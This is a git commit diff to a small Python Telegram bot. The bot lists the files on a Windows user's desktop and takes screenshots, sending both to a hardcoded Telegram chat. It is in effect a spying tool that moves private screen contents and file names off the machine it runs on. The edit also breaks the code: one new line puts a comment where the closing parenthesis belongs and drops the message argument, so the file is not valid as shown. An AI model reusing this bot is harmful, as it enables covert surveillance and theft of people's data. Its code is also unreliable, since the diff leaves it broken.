7ae45242525b1da81cd457520f353e7f8aadc4f9
Alex37321 <149672429+Alex37321@users.noreply.github.com>
2023-11-13 15:42:39 +0300

    main.py

--- main.py
+++ main.py
@@ -3,22 +3,19 @@ from getpass import getuser
 from telebot import TeleBot
 from pyautogui import screenshot
 
-bot = TeleBot('Токен вашего бота')
+bot = TeleBot('Токен вашего бота / Bot token')
 directory = listdir(f'C://Users/{getuser()}/Desktop')
 
 
 @bot.message_handler(commands=['desktop'])
 def desktop(message):
     for data in directory:
-        bot.send_message(1902012012  # Это рандомный набор цифр(тут вы должны указать ID вашего с ботом чата.Как его узнать ,вы сможете найти в файле Как узнать ID.txt)
-, data)
-
+        bot.send_message(1902012012  # ID чата / Chat ID)
 
 @bot.message_handler(commands=['screenshot'])
 def get_screen(message):
     photo = screenshot('screen.jpg')
-    bot.send_photo(1902012012 # Тут тоже ID чата
-, photo)
+    bot.send_photo(1902012012, photo)
     remove('screen.jpg')
 
 
